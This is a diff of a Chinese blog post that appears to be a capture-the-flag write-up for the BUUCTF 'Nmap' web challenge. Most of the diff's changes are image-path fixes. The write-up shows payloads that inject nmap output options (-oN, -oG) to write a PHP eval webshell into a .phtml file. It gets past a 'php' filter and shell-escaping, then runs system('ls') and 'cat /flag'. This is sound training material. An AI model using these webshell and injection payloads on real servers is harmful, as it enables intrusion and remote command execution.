@@ -16,20 +16,39 @@
   <meta name="author" content="South">
   <meta name="keywords" content="">
   
-    <meta name="description" content="[网鼎杯 2020 朱雀组]Nmap1.有题目提示得这是一道考察Nmap执行的题目:![image-20230822100327583](images&#x2F;[网鼎杯 2020 朱雀组]Nmap\image-20230822100327583.png) 输入框中我们可以输入ip地址或hostname 测试: 1127.0.0.1  响应结果:  2.在kali中测试nmap: nmap对ip地">
+    <meta name="description" content="[网鼎杯 2020 朱雀组]Nmap1.有题目提示得这是一道考察Nmap执行的题目: 输入框中我们可以输入ip地址或hostname 测试: 1127.0.0.1  响应结果:  2.在kali中测试nmap: nmap对ip地址的处理 扫描IP地址: nmap 127.0.0.1: 返回的结果: 123Not shown: 1000 closed tcp ports (conn-refused)">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BUUCTF_WEB_[网鼎杯 2020 朱雀组]Nmap 题解">
 <meta property="og:url" content="http://example.com/2023/08/22/2023-08-22-[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]Nmap/index.html">
 <meta property="og:site_name" content="South">
-<meta property="og:description" content="[网鼎杯 2020 朱雀组]Nmap1.有题目提示得这是一道考察Nmap执行的题目:![image-20230822100327583](images&#x2F;[网鼎杯 2020 朱雀组]Nmap\image-20230822100327583.png) 输入框中我们可以输入ip地址或hostname 测试: 1127.0.0.1  响应结果:  2.在kali中测试nmap: nmap对ip地">
+<meta property="og:description" content="[网鼎杯 2020 朱雀组]Nmap1.有题目提示得这是一道考察Nmap执行的题目: 输入框中我们可以输入ip地址或hostname 测试: 1127.0.0.1  响应结果:  2.在kali中测试nmap: nmap对ip地址的处理 扫描IP地址: nmap 127.0.0.1: 返回的结果: 123Not shown: 1000 closed tcp ports (conn-refused)">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2023/08/22/2023-08-22-[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]Nmap/image-20230822100434322.png">
-<meta property="og:image" content="http://example.com/2023/08/22/2023-08-22-[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]Nmap/Users/DELL/AppData/Roaming/Typora/typora-user-images/image-20230822132932341.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822100327583.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822100434322.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822101659678.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822102909620.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822103048486.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822104553681.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822105255949.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822105623631.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822105915275.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822115002077.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822115127287.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822115207663.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822115311166.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822125459893.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822125704414.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822130015713.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822131843981.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822132212701.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822132957714.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822132932341.png">
+<meta property="og:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822133218223.png">
 <meta property="article:published_time" content="2023-08-22T08:20:35.588Z">
-<meta property="article:modified_time" content="2023-08-22T09:17:03.931Z">
+<meta property="article:modified_time" content="2023-08-22T12:19:29.060Z">
 <meta property="article:author" content="South">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2023/08/22/2023-08-22-[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]Nmap/image-20230822100434322.png">
+<meta name="twitter:image" content="http://example.com/images/2023-08-22_Nmap/image-20230822100327583.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -253,7 +272,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          4.8k 字
+          3k 字
         
       </span>
     
@@ -264,7 +283,7 @@
         
         
         
-          41 分钟
+          26 分钟
         
       </span>
     
@@ -314,24 +333,24 @@
             
               <div class="markdown-body">
                 
-                <h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>1.有题目提示得这是一道考察Nmap执行的题目:<br>![image-20230822100327583](images&#x2F;[网鼎杯 2020 朱雀组]Nmap\image-20230822100327583.png)</p>
+                <h2 id="网鼎杯-2020-朱雀组-Nmap"><a href="#网鼎杯-2020-朱雀组-Nmap" class="headerlink" title="[网鼎杯 2020 朱雀组]Nmap"></a>[网鼎杯 2020 朱雀组]Nmap</h2><p>1.有题目提示得这是一道考察Nmap执行的题目:<br><img src="/images/2023-08-22_Nmap/image-20230822100327583.png" srcset="/img/loading.gif" lazyload alt="image-20230822100327583"></p>
 <p>输入框中我们可以输入ip地址或hostname</p>
 <p>测试:</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1<br></code></pre></td></tr></table></figure>
 
 <p>响应结果:</p>
-<p><img src="/2023/08/22/2023-08-22-[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]Nmap/image-20230822100434322.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/2023-08-22_Nmap/image-20230822100434322.png" srcset="/img/loading.gif" lazyload alt="image-20230822100434322"></p>
 <p>2.在kali中测试nmap:</p>
 <p>nmap对ip地址的处理</p>
 <p><strong>扫描IP地址:</strong></p>
-<p>nmap 127.0.0.1:<br>![image-20230822101659678](images[网鼎杯 2020 朱雀组]Nmap\image-20230822101659678.png)</p>
+<p>nmap 127.0.0.1:<br><img src="/images/2023-08-22_Nmap/image-20230822101659678.png" srcset="/img/loading.gif" lazyload alt="image-20230822101659678"></p>
 <p>返回的结果:</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">Not shown: 1000 closed tcp ports (conn-refused)<br><br>Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds<br></code></pre></td></tr></table></figure>
 
 <p>而网站中的返回结果为:</p>
-<p>![image-20230822102909620](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822102909620.png)</p>
+<p><img src="/images/2023-08-22_Nmap/image-20230822102909620.png" srcset="/img/loading.gif" lazyload alt="image-20230822102909620"></p>
 <p>两者的返回结果都是TCP协议，然后有Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds</p>
-<p>**扫描指定IP地址(ping 扫描)**：<br>![image-20230822103048486](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822103048486.png)</p>
+<p>**扫描指定IP地址(ping 扫描)**：<br><img src="/images/2023-08-22_Nmap/image-20230822103048486.png" srcset="/img/loading.gif" lazyload alt="image-20230822103048486"></p>
 <p>返回结果中没有表明是TCP协议</p>
 <p>所以一般网站使用TCP返回，都是nmap扫描或nmap -sT 扫描(默认是nmap)</p>
 <p>猜测该网址的扫描形式为:nmap “输入的ip地址”</p>
@@ -339,43 +358,43 @@
 <p>nmap中可以用于将扫描结果写文件并输出保存在本地的命令:</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs txt">-oN (标准输出)<br><br>-oX (XML输出)<br><br>-oS (ScRipT KIdd|3 oUTpuT)<br><br>-oG (Grep输出)<br><br>-oA (输出至所有格式)<br></code></pre></td></tr></table></figure>
 
-<p>测试:<br>nmap  127.0.0.1 -oN test.txt:<br>![image-20230822104553681](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822104553681.png)</p>
+<p>测试:<br>nmap  127.0.0.1 -oN test.txt:<br><img src="/images/2023-08-22_Nmap/image-20230822104553681.png" srcset="/img/loading.gif" lazyload alt="image-20230822104553681"></p>
 <p>发现在当前文件夹中生成了一个test.txt文件</p>
 <p>所以我们可以利用输出这个漏洞，将一句话木马写入文件中，利用该输出漏洞将一句话木马文件保存到网页的当前文件夹中，就可以实现注入</p>
 <p>测试2:</p>
 <p>测试网页是否可以进行输出命令的执行:<br>payload:</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">127.0.0.1 -oN test.txt<br></code></pre></td></tr></table></figure>
 
-<p>![image-20230822105255949](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822105255949.png)</p>
+<p><img src="/images/2023-08-22_Nmap/image-20230822105255949.png" srcset="/img/loading.gif" lazyload alt="image-20230822105255949"></p>
 <p>网页成功回显，且返回的结果和测试的结果相似，说明该指令被成功执行，所以我们就可以构造注入payload</p>
 <p>3.构造一句话木马:</p>
 <p>payload:</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;  -oN pass.php<br></code></pre></td></tr></table></figure>
 
-<p>响应结果:<br>![image-20230822105623631](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822105623631.png)</p>
+<p>响应结果:<br><img src="/images/2023-08-22_Nmap/image-20230822105623631.png" srcset="/img/loading.gif" lazyload alt="image-20230822105623631"></p>
 <p>发现输入的结果可能被过滤,采用第二个payload试试<br>payload2:</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;pass&#x27;]);&lt;/script&gt; -oN pass.php<br></code></pre></td></tr></table></figure>
 
-<p>![image-20230822105915275](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822105915275.png)</p>
+<p><img src="/images/2023-08-22_Nmap/image-20230822105915275.png" srcset="/img/loading.gif" lazyload alt="image-20230822105915275"></p>
 <p>依然被过滤</p>
 <p>4.现在就要一个个进行判断，寻找被过滤的内容:<br>payload:</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt; <br></code></pre></td></tr></table></figure>
 
-<p>![image-20230822115002077](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822115002077.png)</p>
+<p><img src="/images/2023-08-22_Nmap/image-20230822115002077.png" srcset="/img/loading.gif" lazyload alt="image-20230822115002077"></p>
 <p>存在黑名单内容</p>
 <p>payload:</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?<br></code></pre></td></tr></table></figure>
 
-<p>![image-20230822115127287](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822115127287.png)</p>
+<p><img src="/images/2023-08-22_Nmap/image-20230822115127287.png" srcset="/img/loading.gif" lazyload alt="image-20230822115127287"></p>
 <p>由于该文件不可被识别，所以就无法显示内容</p>
 <p>payload:</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?php<br></code></pre></td></tr></table></figure>
 
-<p>![image-20230822115207663](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822115207663.png)</p>
+<p><img src="/images/2023-08-22_Nmap/image-20230822115207663.png" srcset="/img/loading.gif" lazyload alt="image-20230822115207663"></p>
 <p>payload:</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?ph<br></code></pre></td></tr></table></figure>
 
-<p>![image-20230822115311166](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822115311166.png)</p>
+<p><img src="/images/2023-08-22_Nmap/image-20230822115311166.png" srcset="/img/loading.gif" lazyload alt="image-20230822115311166"></p>
 <p>所以过滤的内容为php,我们需要绕过php判断</p>
 <p><strong>php一句话木马的构造</strong></p>
 <p>可以解析php文件的后缀名:</p>
@@ -420,33 +439,35 @@
 
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> <br><span class="hljs-keyword">echo</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir&quot;</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>输出：<br>![image-20230822125459893](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822125459893.png)</p>
+<p>输出：</p>
+<p><img src="/images/2023-08-22_Nmap/image-20230822125459893.png" srcset="/img/loading.gif" lazyload alt="image-20230822125459893"></p>
 <?= @eval($_POST['pass'];?><p>:</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;dir&quot;</span>));<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
 
-<p>输出结果：<br>![image-20230822125704414](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822125704414.png)</p>
+<p>输出结果：</p>
+<p><img src="/images/2023-08-22_Nmap/image-20230822125704414.png" srcset="/img/loading.gif" lazyload alt="image-20230822125704414"></p>
 <p>payload:</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt;<br></code></pre></td></tr></table></figure>
 
-<p>![image-20230822130015713](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822130015713.png)</p>
+<p><img src="/images/2023-08-22_Nmap/image-20230822130015713.png" srcset="/img/loading.gif" lazyload alt="image-20230822130015713"></p>
 <p>绕过</p>
 <p>构造写文件输出payload:</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">&lt;?= @eval($_POST[&#x27;pass&#x27;]);?&gt; -oG pass.phtml<br></code></pre></td></tr></table></figure>
 
-<p>![image-20230822131843981](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822131843981.png)</p>
+<p><img src="/images/2023-08-22_Nmap/image-20230822131843981.png" srcset="/img/loading.gif" lazyload alt="image-20230822131843981"></p>
 <p>发现成功绕过:<br>访问pass.phtml:</p>
 <p>由于当于oG输出的文件都在当前文件夹下所以为:<a target="_blank" rel="noopener" href="http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.html">http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.html</a></p>
-<p>![image-20230822132212701](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822132212701.png)</p>
+<p><img src="/images/2023-08-22_Nmap/image-20230822132212701.png" srcset="/img/loading.gif" lazyload alt="image-20230822132212701"></p>
 <p>发现当前网站下没有该文件，从之前的[BUUCTF 2018]Online Tool中获取的经验，nmap可能和escapeshellarg()与escapeshellcmd()配合使用，需要绕过这两个函数：使用空格和单引号,为了防止’pass’的单引号也被这两个函数过滤，我们这里使用”pass”:<br>payload:</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">&#x27; &lt;?= @eval($_POST[&quot;pass&quot;]);?&gt; -oG pass.phtml &#x27;<br><br>&#x27; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml &#x27;<br></code></pre></td></tr></table></figure>
 
-<p>![image-20230822132957714](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822132957714.png)</p>
+<p><img src="/images/2023-08-22_Nmap/image-20230822132957714.png" srcset="/img/loading.gif" lazyload alt="image-20230822132957714"></p>
 <p>访问pass.phtml:<a target="_blank" rel="noopener" href="http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.phtml">http://bd9c6623-f4d3-4f23-bf75-6978d1a50003.node4.buuoj.cn:81/pass.phtml</a></p>
-<p><img src="/2023/08/22/2023-08-22-[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E6%9C%B1%E9%9B%80%E7%BB%84]Nmap/Users\DELL\AppData\Roaming\Typora\typora-user-images\image-20230822132932341.png" srcset="/img/loading.gif" lazyload alt="image-20230822132932341"></p>
+<p><img src="/images/2023-08-22_Nmap/image-20230822132932341.png" srcset="/img/loading.gif" lazyload alt="image-20230822132932341"></p>
 <p>使用webshell测试:<br>payload:</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&quot;ls&quot;);<br></code></pre></td></tr></table></figure>
 
-<p>![image-20230822133218223](D:\hexo-blog\source_posts[网鼎杯 2020 朱雀组]Nmap\image-20230822133218223.png)</p>
+<p><img src="/images/2023-08-22_Nmap/image-20230822133218223.png" srcset="/img/loading.gif" lazyload alt="image-20230822133218223"></p>
 <p>发现一个flag文件:<br>payload:</p>
 <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">POST:<br>pass=system(&quot;cat /flag&quot;);<br></code></pre></td></tr></table></figure>
 
